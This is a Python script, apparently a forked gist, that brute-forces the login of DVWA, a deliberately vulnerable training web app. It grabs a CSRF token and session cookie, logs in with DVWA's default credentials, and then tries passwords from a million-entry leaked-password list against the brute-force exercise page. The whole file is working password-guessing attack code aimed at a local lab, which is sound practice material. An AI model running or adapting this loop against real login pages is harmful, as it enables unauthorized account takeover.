# redmondmj/DVWAbruteforceBreaker.py
# Forked from KnightChaser/DVWAbruteforceBreaker.py

# For Passwords:
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

import requests
import sys
from bs4 import BeautifulSoup
from time import sleep

# fancy color! 
class colorBrights:
    BLACK = '\033[90m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'             # decolorize

class colorDeaults:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'             # decolorize

################ DVWA DEFAULT USER LIST ###############
#
#   admin
#   gordonb
#   1337
#   pablo
#   smithy
#
#######################################################

##################################################################################
targetIPAddr = "192.168.123.128"                # target system's IP address
targetUserID = "pablo"                        # user ID who will be tested
dvwa_user = "1337"                              # tester's DVWA ID
dvwa_password = "charley"                       # tester's DVWA password
##################################################################################

target = f"http://localhost"
securityLevel = 'low'

success_flag = "Welcome to the password protected area"

def getLoginTokenFromDVWA():
    try:
        print(f"[~] Try to login to the {target}/login.php")
        response = requests.get(f"{target}/login.php", allow_redirects = False)
        soup = BeautifulSoup(response.text, features="html.parser")
    except Exception as exceptionMessage:
        print(f"[-] Getting CSRF Token is {colorDeaults.RED} failed. {colorDeaults.RESET} Target was {target}/login.php. Message : {exceptionMessage}")
        sys.exit(-1)

    # userToken is for prevention of CSRF(Cross-Site Request Forgery)
    print(f"[+] Login succeeded to the {target}/login.php")
    response.headers = dict(response.headers)
    userToken = soup("input", {"name" : "user_token"})[0]["value"]
    sessionID = response.headers["Set-Cookie"].split()[0].replace("PHPSESSID=","").replace(";","")
    
    print(f"[+] You've got user token as {colorBrights.BLUE}{userToken}{colorBrights.END}")
    print(f"[+] You've got user session ID as {colorBrights.BLUE}{sessionID}{colorBrights.END}")

    return userToken, sessionID


def loginToDVWA(userToken, sessionID):

    # cookie & data to send via POST method

    data = {"username" : dvwa_user, "password" : dvwa_password, "user_token" : userToken, "Login" : "Login"}
    cookie = {"PHPSESSID" : sessionID, "security" : securityLevel}

    try:
        print(f"[+] Try to login as [{dvwa_user}] with password [{dvwa_password}]")
        response = requests.post(f"{target}/login.php", data = data, cookies = cookie, allow_redirects = False)
    except Exception as exceptionMessage:
        print(f"[-] Exception occured! Halt the process. Target was {target}/login.php. Message : {exceptionMessage}")
        sys.exit(-1)

    if response.status_code != 301 and response.status_code != 302 :
        print(f"[-] Login failed because returned status code was {response.status_code}")
        sys.exit(-1)

    # You will be moved index.php automatically if you succeeded login procedure
    currentLocation = response.headers["Location"]
    if currentLocation != "index.php":
        print(f"[-] Login finish failed because you've not moved to index.php.")
        print(f"[-] You're now in the {currentLocation}.")
        sys.exit(-1)

    # logged in successfully.
    print(f"[+] LOGGED IN {colorBrights.GREEN}SUCCESSFULLY{colorBrights.END} AS {colorBrights.GREEN}[{dvwa_user}/{dvwa_password}]{colorBrights.END}")
    return True

# actual bruteforce!
def tryAccountLogin(tryingUserName, sessionID):

    cookie = {"PHPSESSID" : sessionID, "security" : securityLevel}

    list = open("10-million-password-list-top-1000000.txt", "rt")
    passwordList = list.readlines()

    trialCount = 0

    # try bruteforce attack with password examination data stored in text file, approximately 10 million samples.
    for passwordTrial in passwordList:

        # deattach unnecessary following newline characters
        passwordTrial = passwordTrial.rstrip('\n')

        try:

            print(f"[~] {colorDeaults.GREEN}{trialCount}{colorDeaults.END} trial(s) have been tested. Testing password {colorDeaults.GREEN}{passwordTrial}{colorDeaults.END} is now being bruteforcing.")

            # send actual request to the server with suggested payload
            data = {"username" : tryingUserName, "password" : passwordTrial, "Login" : "Login"}
            response = requests.get(f"{target}/vulnerabilities/brute/", params = data, cookies = cookie, allow_redirects = False)
            trialCount += 1

            if success_flag in response.text:
                print(f"[!] PASSWORD CRACKED! {colorBrights.YELLOW}[{tryingUserName}]{colorBrights.END}'s password is {colorBrights.YELLOW}[{passwordTrial}]{colorBrights.END}.")
                return
                
        except Exception as exceptionMessage:

            for _retryCount in range(1, 10 + 1):

                if _retryCount >= 10:
                    # maximum trial count exceeded
                    return

                try:

                    # retry in 2 second, up to 10 times
                    sleep(2)
                    response = requests.get(f"{target}/vulnerabilities/brute/", params = data, cookies = cookie, allow_redirects = False)

                    print(f"[~] {colorBrights.RED}[RETRY COUNT : {_retryCount} / 10]{colorBrights.END} {colorDeaults.GREEN}{trialCount}{colorDeaults.END} trial(s) have been tested. Testing password {colorDeaults.GREEN}{passwordTrial}{colorDeaults.END} is being bruteforcing.")

                except:
                    continue

                else:
                    # retry successful, try next password candidate
                    break

        if response.status_code != 200:
            print(f"[-] Response code is not acceptable case. Code was {response.status_code}.")
            return 

    print(f"[!] {colorBrights.RED}FAIL...{colorBrights.END} PASSWORD COULDN'T BE CRACKED! ALL DATA EXHAUSTED...")



if __name__ == "__main__":

    message = """
    CRACK THE WEAK PASSWORD IN DVWA BRUTEFORCE EXERCISE PRACTICE SITE!
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗██████╗ 
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  ██████╔╝
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  ██╔══██╗
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
           @SayoFrenchFries. Lee Garam.                                                                                                                                                                                 
    """
    print(message, end = '\n')

    sleep(3)

    userToken, sessionID =  getLoginTokenFromDVWA()
    loginToDVWA(userToken, sessionID)

    sleep(3)

    tryAccountLogin(targetUserID, sessionID)